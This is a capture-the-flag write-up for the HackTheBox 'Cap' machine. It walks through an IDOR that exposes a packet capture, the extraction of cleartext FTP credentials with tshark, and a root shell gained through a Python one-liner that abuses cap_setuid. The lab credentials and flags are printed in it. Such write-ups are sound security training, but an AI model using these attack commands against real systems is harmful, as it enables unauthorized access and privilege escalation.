Cap

Technical Deep-Dive

🖥️ Overview

  • Machine: Cap (HackTheBox)
  • Difficulty: Easy
  • Platform: Linux (Ubuntu)
  • Exposed services: FTP (21), SSH (22), HTTP (80) – Gunicorn Security Dashboard

🔍 Recon & Enumeration

  • Nmap discovered open ports 21/tcp (vsftpd 3.0.3), 22/tcp (OpenSSh 8.2p1), 80/tcp (Gunicorn)
  • Anonymous FTP login failed
  • Web app endpoints: /capture (redirects to /data/1), /ip (ifconfig output), /netstat (active connections)
  • IDOR found: direct access to /data/0 reveals a download button for /download/0

🔑 Initial Access

  • Downloaded PCAP via /download/0 (IDOR)
  • Extracted FTP credentials with tshark: USER nathan, PASS Buck3tH4TF0RM3!
  • Reused credentials for SSH login as nathan
  • Obtained user flag: 2874475212d535da1ca01f207b3a6939

⬆️ Privilege Escalation

  • Enumerated Linux capabilities: getcap -r / showed /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
  • Python interpreter with cap_setuid can change its UID to 0 (root)
  • Exploit: python3.8 -c 'import os; os.setuid(0); os.system("bash")'
  • Spawned root shell and retrieved root flag: 006b90cfdd1f951eb31fe3278eb85847

🧰 Tools & Techniques

  • nmap -sC -sV for service/version detection
  • curl to test IDOR endpoints and download PCAP
  • tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg to pull credentials
  • ssh nathan@ for initial foothold
  • getcap -r / 2>/dev/null to find capable binaries
  • python3.8 -c 'import os; os.setuid(0); os.system("bash")' for root shell

💡 Lessons Learned

  • Always test low numeric IDs (0,1,2) on predictable endpoints to uncover IDOR
  • FTP transmits credentials in cleartext; any PCAP containing FTP traffic exposes them – prefer TLS‑protected alternatives
  • Enumerate Linux capabilities (getcap -r/) as a critical step in PrivEsc; cap_setuid on interpreters is instantly exploitable
  • Machine name "Cap" hints at both PCAP capture and Linux capabilities – naming can guide enumeration
  • GTFOBins documents capability‑based abuse for Python, Perl, Ruby, etc.
